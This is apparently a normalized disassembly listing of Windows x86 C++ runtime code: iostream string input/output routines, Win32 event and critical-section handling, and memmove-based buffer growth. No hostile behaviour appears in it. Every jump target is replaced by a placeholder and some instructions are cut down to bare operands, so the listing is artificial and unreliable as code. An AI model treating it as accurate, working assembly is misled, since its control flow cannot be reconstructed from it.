call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_410960
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
test eax eax
jne r-xdata
push edi
mov ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
xor edx edx
mov dl [ eax ]
push edx
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::sputc@IAT ]
mov [ ebp - 0x24 ] eax
call [ std::char_traits<char>::eof@IAT ]
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
call [ std::char_traits<char>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
cmp [ ebp - 0x14 ] edi
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::fill@IAT ]
push eax
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::sputc@IAT ]
mov [ ebp - 0x18 ] eax
call [ std::char_traits<char>::eof@IAT ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
call [ std::char_traits<char>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
push 0x0
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
jmp r-xdata
test ebx ebx
jbe r-xdata
inc edi
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec ebx
mov [ ebp - 0x38 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::fill@IAT ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<char,struct std::char_traits<char> >::sputc@IAT ]
mov [ ebp - 0x30 ] eax
call [ std::char_traits<char>::eof@IAT ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x30 ]
push edx
lea eax [ ebp - 0x34 ]
push eax
call [ std::char_traits<char>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
dec ebx
mov [ ebp - 0x38 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_4110d3
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_410960
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411120
push ebp
mov ebp esp
push 0xffffffff
push sub_430b99
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x11 ] 0x0
push edi
mov esi [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x34 ]
call sub_410820
mov [ ebp - 0x4 ] edi
mov al [ ebp - 0x30 ]
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x0
push 0x0
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
mov al [ ebp - 0x11 ]
test al al
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::ios_base::getloc@IAT ]
mov [ ebp - 0x4 ] 0x1
push eax
call sub_410210
add esp 0x4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x20 ]
call [ std::locale::~locale@IAT ]
mov edx [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov eax [ edx ]
push eax
push edi
mov ebx [ ebp + 0xc ]
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
test eax eax
jle r-xdata
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x18 ] 0x2
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::max_size@IAT ]
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
mov edi eax
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::max_size@IAT ]
cmp edi eax
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Unlock@IAT ]
call [ std::char_traits<wchar_t>::eof@IAT ]
mov [ ebp - 0x24 ] eax
lea edx [ ebp - 0x1c ]
push edx
lea eax [ ebp - 0x24 ]
push eax
call [ std::char_traits<wchar_t>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
call [ std::char_traits<wchar_t>::to_char_type@IAT ]
add esp 0x4
push eax
push 0x48
mov ecx [ ebp - 0x28 ]
call [ std::ctype<wchar_t>::is@IAT ]
test al al
jne r-xdata
or [ ebp - 0x18 ] 0x1
jmp r-xdata
mov edi eax
mov [ ebp - 0x2c ] edi
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sgetc@IAT ]
lea edx [ ebp - 0x1c ]
push edx
call [ std::char_traits<wchar_t>::to_char_type@IAT ]
add esp 0x4
push eax
push 0x1
mov ecx ebx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
mov [ ebp - 0x11 ] 0x1
dec edi
mov [ ebp - 0x2c ] edi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::snextc@IAT ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
test edi edi
jbe r-xdata
sub_4112a9
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
push 0x0
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
mov al [ ebp - 0x11 ]
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x18 ] 0x2
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Unlock@IAT ]
sub_411330
push ebp
mov ebp esp
push 0xffffffff
push sub_430bc0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x11 ] 0x0
mov ebx 0x1
push ebx
mov esi [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x2c ]
call sub_410820
mov [ ebp - 0x4 ] edi
mov al [ ebp - 0x28 ]
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov al [ ebp - 0x11 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] bl
mov eax [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::npos@IAT ]
mov ecx [ eax ]
push ecx
push edi
mov edi [ ebp + 0xc ]
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
lea edx [ ebp + 0x10 ]
push edx
call [ std::char_traits<wchar_t>::to_int_type@IAT ]
add esp 0x4
mov [ ebp - 0x24 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sgetc@IAT ]
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x18 ] 0x2
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
call [ std::char_traits<wchar_t>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
or [ ebp - 0x18 ] ebx
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Unlock@IAT ]
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::size@IAT ]
mov ebx eax
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::max_size@IAT ]
cmp eax ebx
ja r-xdata
mov [ ebp - 0x11 ] bl
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sbumpc@IAT ]
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ std::char_traits<wchar_t>::to_char_type@IAT ]
add esp 0x4
push eax
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
mov ebx 0x1
mov [ ebp - 0x11 ] bl
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::snextc@IAT ]
jmp r-xdata
or [ ebp - 0x18 ] 0x2
jmp r-xdata
mov [ ebp - 0x1c ] eax
call [ std::char_traits<wchar_t>::eof@IAT ]
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
call [ std::char_traits<wchar_t>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
sub_4114f0
push ebp
mov ebp esp
push 0xffffffff
push sub_430bd8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::size@IAT ]
mov edi eax
mov [ ebp - 0x20 ] edi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
test eax eax
jle r-xdata
push esi
lea ecx [ ebp - 0x40 ]
call sub_4109e0
xor edi edi
mov [ ebp - 0x4 ] edi
mov al [ ebp - 0x3c ]
test al al
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::ios_base::flags@IAT ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
mov ebx eax
sub ebx edi
mov [ ebp - 0x2c ] edi
cmp edi [ ebp - 0x20 ]
jae r-xdata
cmp ebx edi
jbe r-xdata
mov [ ebp - 0x4 ] 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_410aa0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
test eax eax
jne r-xdata
push edi
mov ecx [ ebp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator[]@IAT ]
xor edx edx
mov dx [ eax ]
push edx
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sputc@IAT ]
mov [ ebp - 0x24 ] eax
call [ std::char_traits<wchar_t>::eof@IAT ]
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
call [ std::char_traits<wchar_t>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
cmp [ ebp - 0x14 ] edi
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::fill@IAT ]
push eax
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sputc@IAT ]
mov [ ebp - 0x18 ] eax
call [ std::char_traits<wchar_t>::eof@IAT ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
call [ std::char_traits<wchar_t>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
push 0x0
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::ios_base::width@IAT ]
jmp r-xdata
test ebx ebx
jbe r-xdata
inc edi
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec ebx
mov [ ebp - 0x38 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::fill@IAT ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
mov ecx eax
call [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sputc@IAT ]
mov [ ebp - 0x30 ] eax
call [ std::char_traits<wchar_t>::eof@IAT ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x30 ]
push edx
lea eax [ ebp - 0x34 ]
push eax
call [ std::char_traits<wchar_t>::eq_int_type@IAT ]
add esp 0x8
test al al
je r-xdata
dec ebx
mov [ ebp - 0x38 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_4116d4
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_410aa0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411720
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push 0xa
add ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::widen@IAT ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push esi
call sub_410d30
add esp 0xc
pop esi
retn
sub_411750
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push 0xa
add ecx esi
call [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::widen@IAT ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push esi
call sub_411330
add esp 0xc
pop esi
retn
sub_411780
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ CloseHandle@IAT ]
push eax
call edi
mov ecx [ esi + 0x8 ]
push ecx
call edi
pop edi
pop esi
retn
sub_411800
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov eax edx
shr eax 0x1
push esi
lea esi [ eax + eax ]
sub edx esi
mov esi [ ecx + 0x8 ]
cmp esi eax
ja r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
lea eax [ eax + edx * 8 ]
pop esi
retn
sub eax esi
sub_4118e0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
sub eax ecx
push esi
sar eax 0x2
lea esi [ eax * 4 ]
mov eax [ esp + 0x10 ]
push esi
push ecx
push eax
call [ memmove@IAT ]
add esp 0xc
add eax esi
pop esi
retn
sub_411920
mov ecx [ esp + 0x8 ]
test ecx ecx
jbe r-xdata
retn
mov edx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
mov esi [ edx ]
mov [ eax ] esi
add eax 0x4
dec ecx
jne r-xdata
pop esi
sub_411940
push 0xffffffff
push sub_430bf8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea edi [ eax + 0x4 ]
push edi
mov [ esp + 0x10 ] eax
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x18 ] 0x0
mov ebx [ CreateEventW@IAT ]
push 0x0
push 0x0
push 0x1
push 0x0
mov [ esi ] 0x1
call ebx
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov [ esp + 0x18 ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push 0x0
push 0x0
push 0x1
push 0x0
call ebx
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
mov [ esp + 0x18 ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov eax 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x4 ]
push eax
call [ CloseHandle@IAT ]
sub_411a00
push 0xffffffff
push sub_430c18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea edi [ eax + 0x4 ]
push edi
mov [ esp + 0xc ] eax
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x14 ] 0x0
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] 0x1
call [ SetEvent@IAT ]
mov [ esp + 0x14 ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_411ac0
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov eax edx
shr eax 0x1
push esi
lea esi [ eax + eax ]
sub edx esi
mov esi [ ecx + 0x8 ]
cmp esi eax
ja r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
lea eax [ eax + edx * 8 ]
pop esi
retn
sub eax esi
sub_411b00
push 0xffffffff
push sub_430c41
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push r--data
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4c ] 0x0
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
call sub_403eb0
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x1c ] r--data
mov [ esp + 0x4c ] 0x0
push r--data
lea ecx [ esp + 0x20 ]
push ecx
call _CxxThrowException
sub_411bb0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
sub eax ecx
push esi
sar eax 0x2
lea esi [ eax * 4 ]
mov eax [ esp + 0x10 ]
push esi
push ecx
push eax
call [ memmove@IAT ]
add esp 0xc
add eax esi
pop esi
retn
sub_411c10
mov ecx [ esp + 0x8 ]
test ecx ecx
mov eax [ esp + 0x4 ]
jbe r-xdata
retn
mov edx [ esp + 0xc ]
push esi
mov esi [ edx ]
mov [ eax ] esi
add eax 0x4
dec ecx
jne r-xdata
pop esi
sub_411c30
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
retn
mov edx [ ecx + 0xc ]
push edi
mov edi [ ecx + 0x8 ]
inc edx
shl edi 0x1
cmp edi edx
mov [ ecx + 0xc ] edx
pop edi
ja r-xdata
dec eax
mov [ ecx + 0x10 ] eax
jne r-xdata
mov [ ecx + 0xc ] 0x0
mov [ ecx + 0xc ] 0x0
sub_411cc0
mov ecx [ esp + 0x8 ]
test ecx ecx
mov eax [ esp + 0x4 ]
jbe r-xdata
retn
mov edx [ esp + 0xc ]
push esi
mov esi [ edx ]
mov [ eax ] esi
add eax 0x4
dec ecx
jne r-xdata
pop esi
sub_411ce0
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
retn
mov edx [ ecx + 0xc ]
push edi
mov edi [ ecx + 0x8 ]
inc edx
shl edi 0x1
cmp edi edx
mov [ ecx + 0xc ] edx
pop edi
ja r-xdata
dec eax
mov [ ecx + 0x10 ] eax
jne r-xdata
mov [ ecx + 0xc ] 0x0
mov [ ecx + 0xc ] 0x0
sub_411d30
mov edx [ ecx + 0xc ]
mov eax edx
shr eax 0x1
push esi
lea esi [ eax + eax ]
sub edx esi
mov esi [ ecx + 0x8 ]
cmp esi eax
ja r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
lea eax [ eax + edx * 8 ]
pop esi
retn
sub eax esi
sub_411d60
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
xor ebx ebx
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
lea ecx [ ecx ]
mov eax [ esi + 0x4 ]
cmp eax ebx
pop edi
je r-xdata
nop
cmp [ esi + 0x10 ] ebx
jne r-xdata
dec eax
cmp eax ebx
mov [ esi + 0x10 ] eax
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
push eax
call ??3@YAXPAX@Z
add esp 0x4
cmp edi ebx
ja r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] ebx
mov eax [ esi + 0x4 ]
mov eax [ eax + edi * 4 - 0x4 ]
dec edi
cmp eax ebx
je r-xdata
sub_411dd0
sub esp 0xc
push ebx
mov ebx ecx
mov eax [ ebx + 0x8 ]
mov ecx 0xfffffff
push edi
mov edi [ esp + 0x18 ]
sub ecx eax
cmp ecx edi
jae r-xdata
mov ecx eax
shr ecx 0x1
cmp ecx 0x8
jae r-xdata
mov ecx ebx
call sub_411b00
cmp edi ecx
jae r-xdata
mov ecx 0x8
push ebp
mov ebp [ ebx + 0xc ]
add eax edi
shl eax 0x2
push esi
push eax
shr ebp 0x1
call sub_42e3bc
mov ecx [ ebx + 0x4 ]
mov edx eax
lea esi [ ebp * 4 ]
lea eax [ esi + ecx ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x8 ]
shl eax 0x2
sub eax [ esp + 0x18 ]
mov [ esp + 0x14 ] edx
add eax ecx
mov ecx [ esp + 0x18 ]
sar eax 0x2
shl eax 0x2
push eax
push ecx
add edx esi
push edx
mov [ esp + 0x28 ] eax
call [ memmove@IAT ]
mov edx [ esp + 0x28 ]
mov ecx [ ebx + 0x4 ]
add esp 0x10
add eax edx
cmp ebp edi
ja r-xdata
mov edx 0xfffffff
sub edx ecx
cmp eax edx
ja r-xdata
lea ebp [ edi * 4 ]
mov edx ebp
sar edx 0x2
shl edx 0x2
push edx
push ecx
push eax
call [ memmove@IAT ]
mov eax [ ebx + 0x4 ]
lea ecx [ eax + ebp ]
sub esi ecx
add esi eax
mov eax [ esp + 0x1c ]
sar esi 0x2
shl esi 0x2
push esi
push ecx
push eax
call [ memmove@IAT ]
mov edx eax
add esp 0x18
add edx esi
test edi edi
jbe r-xdata
sar esi 0x2
mov edx esi
shl edx 0x2
push edx
push ecx
mov esi edi
push eax
sub esi ebp
mov [ esp + 0x24 ] edx
call [ memmove@IAT ]
mov ecx [ esp + 0x24 ]
mov edx eax
add esp 0xc
add edx ecx
test esi esi
jbe r-xdata
mov [ esp + 0x18 ] ecx
mov edi ecx
mov eax [ ebx + 0x4 ]
test eax eax
pop esi
pop ebp
je r-xdata
mov ecx edi
mov edi edx
test ebp ebp
jbe r-xdata
mov ecx esi
xor eax eax
mov edi edx
[ edi ]
mov edi [ esp + 0x20 ]
mov eax [ ebx + 0x8 ]
mov ecx [ esp + 0x8 ]
add eax edi
pop edi
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] eax
pop ebx
add esp 0xc
retn 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov edi [ esp + 0x10 ]
mov ecx ebp
jmp r-xdata
xor eax eax
[ edi ]
mov edi [ esp + 0x20 ]
sub_411f30
mov edx [ ecx + 0xc ]
mov eax edx
shr eax 0x1
push esi
lea esi [ eax + eax ]
sub edx esi
mov esi [ ecx + 0x8 ]
cmp esi eax
ja r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
lea eax [ eax + edx * 8 ]
pop esi
retn
sub eax esi
sub_411f70
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
add ecx eax
test cl 0x1
push edi
jne r-xdata
mov edi [ esi + 0xc ]
mov eax [ esi + 0x8 ]
push ebx
